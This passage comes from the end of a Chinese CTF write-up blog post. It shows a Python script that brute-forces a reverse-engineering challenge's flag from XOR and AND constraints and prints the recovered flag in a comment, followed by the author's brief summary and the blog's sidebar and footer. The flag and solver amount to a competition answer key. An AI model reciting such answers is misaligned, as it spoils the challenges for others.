class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">a1 = [<span class="number">51</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">44</span>, <span class="number">8</span>, <span class="number">49</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">12</span>]</span><br><span class="line">a2 = [<span class="number">76</span>, <span class="number">101</span>, <span class="number">96</span>, <span class="number">114</span>, <span class="number">100</span>, <span class="number">73</span>, <span class="number">112</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">97</span>]</span><br><span class="line">a3 = [<span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">13</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">asciis = string.ascii_letters+<span class="string">'0123456789'</span>+<span class="string">'_'</span></span><br><span class="line">guess_d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">32</span>):</span><br><span class="line">    temp_list = list()</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> guess_d:</span><br><span class="line">        guess_d[num] = temp_list</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">        temp_list.append(i)</span><br><span class="line"></span><br><span class="line">finall_result = [<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line">finall_result_map = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">    temp_list1 = guess_d[i]</span><br><span class="line">    temp_list2 = guess_d[<span class="number">31</span>-i]</span><br><span class="line">    temp_list3 = []</span><br><span class="line">    temp_list4 = []</span><br><span class="line">    <span class="keyword">for</span> t1 <span class="keyword">in</span> temp_list1:</span><br><span class="line">        <span class="keyword">for</span> t2 <span class="keyword">in</span> temp_list2:</span><br><span class="line">            <span class="keyword">if</span> ((t1 ^ t2) == a1[i] <span class="keyword">and</span> (t1 &amp; t2) == a2[i] <span class="keyword">and</span> t1 &amp; <span class="number">0xF</span> == a3[i] <span class="keyword">and</span> t2 &amp; <span class="number">0xF</span> == a3[<span class="number">31</span>-i]):</span><br><span class="line">                print(<span class="string">'çŹŹ'</span>+str(i)+<span class="string">'ä˝'</span>, <span class="string">' '</span>, chr(t1), <span class="string">'   '</span>, chr(t2))</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> finall_result_map.keys() <span class="keyword">or</span> (<span class="number">31</span>-i) <span class="keyword">not</span> <span class="keyword">in</span> finall_result_map.keys():</span><br><span class="line">                    finall_result_map[i] = temp_list3</span><br><span class="line">                    finall_result_map[(<span class="number">31</span>-i)] = temp_list4</span><br><span class="line">                temp_list3.append(int(t1))</span><br><span class="line">                temp_list4.append(int(t2))</span><br><span class="line">                finall_result[i] = int(t1)</span><br><span class="line"></span><br><span class="line">                finall_result[<span class="number">31</span>-i] = int(t2)</span><br><span class="line"></span><br><span class="line">f1 = []</span><br><span class="line"></span><br><span class="line">finall_strs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sorted(finall_result_map.keys()):</span><br><span class="line">    f1.append(finall_result_map[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> range(len(f1[<span class="number">0</span>])):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> range(len(f1[<span class="number">2</span>])):</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> range(len(f1[<span class="number">5</span>])):</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> range(len(f1[<span class="number">9</span>])):</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> range(len(f1[<span class="number">10</span>])):</span><br><span class="line">                    <span class="keyword">for</span> i6 <span class="keyword">in</span> range(len(f1[<span class="number">12</span>])):</span><br><span class="line">                        <span class="keyword">for</span> i7 <span class="keyword">in</span> range(len(f1[<span class="number">14</span>])):</span><br><span class="line">                            finall_result[<span class="number">0</span>] = f1[<span class="number">0</span>][i1]</span><br><span class="line">                            finall_result[<span class="number">31</span>] = f1[<span class="number">31</span>][i1]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">2</span>] = f1[<span class="number">2</span>][i2]</span><br><span class="line">                            finall_result[<span class="number">29</span>] = f1[<span class="number">29</span>][i2]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">5</span>] = f1[<span class="number">5</span>][i3]</span><br><span class="line">                            finall_result[<span class="number">26</span>] = f1[<span class="number">26</span>][i3]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">9</span>] = f1[<span class="number">9</span>][i4]</span><br><span class="line">                            finall_result[<span class="number">22</span>] = f1[<span class="number">22</span>][i4]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">10</span>] = f1[<span class="number">10</span>][i5]</span><br><span class="line">                            finall_result[<span class="number">21</span>] = f1[<span class="number">21</span>][i5]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">12</span>] = f1[<span class="number">12</span>][i6]</span><br><span class="line">                            finall_result[<span class="number">19</span>] = f1[<span class="number">19</span>][i6]</span><br><span class="line"></span><br><span class="line">                            finall_result[<span class="number">14</span>] = f1[<span class="number">14</span>][i7]</span><br><span class="line">                            finall_result[<span class="number">17</span>] = f1[<span class="number">17</span>][i7]</span><br><span class="line"></span><br><span class="line">                            finall_strs.append(finall_result.copy())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(finall_strs)</span></span><br><span class="line"><span class="comment"># exit(1)</span></span><br><span class="line"><span class="comment"># print(f1)</span></span><br><span class="line"><span class="comment"># print(bytes(finall_result))</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> finall_strs:</span><br><span class="line">    finall_result = j</span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        <span class="keyword">if</span> v6 &gt;= i:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>((finall_result[i] ^ finall_result[v6]) != a1[v6]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>((finall_result[i] &amp; finall_result[v6]) != a2[v6]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(finall_result[i] &amp; <span class="number">0xF</span> != a3[i] <span class="keyword">or</span> finall_result[v6] &amp; <span class="number">0xF</span> != a3[v6]):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        v6 += <span class="number">1</span></span><br><span class="line">    str1 = bytes(finall_result).decode()</span><br><span class="line">    <span class="keyword">if</span>(str1.startswith(<span class="string">'Nep&#123;'</span>) <span class="keyword">and</span> str1.endswith(<span class="string">'&#125;'</span>)):</span><br><span class="line">        print(str1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nep&#123;mircle_and_maho_is_not_free&#125; </span></span><br><span class="line"><span class="comment"># 找看起来最相似的那个</span></span><br></pre></td></tr></table></figure>
+
+<p>最后还要进sub_403000()才能出结果。然而比赛结束了，，，就这样吧。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从解题情况来看，主要的收获还是在学到了下解pyc题的皮毛上，web的几个题都是旧题目的套娃，没啥意思，有意思的4个题都想歪到哪里去都不知道了。有空复现下easyflask和filecheck吧。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/reverse/" rel="tag"># reverse</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/21/powershell简单入门/" rel="next" title="powershell简单入门">
+                <i class="fa fa-chevron-left"></i> powershell简单入门
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">star</p>
+              <p class="site-description motion-element" itemprop="description">ctf wp and technologies about security</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的计算机1，2"><span class="nav-number">2.1.</span> <span class="nav-text">简单的计算机1，2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpunt"><span class="nav-number">2.2.</span> <span class="nav-text">phpunt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number">3.</span> <span class="nav-text">逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easymaze"><span class="nav-number">3.1.</span> <span class="nav-text">easymaze</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pyc修复题"><span class="nav-number">3.2.</span> <span class="nav-text">pyc修复题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#magia"><span class="nav-number">3.3.</span> <span class="nav-text">magia</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">star</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
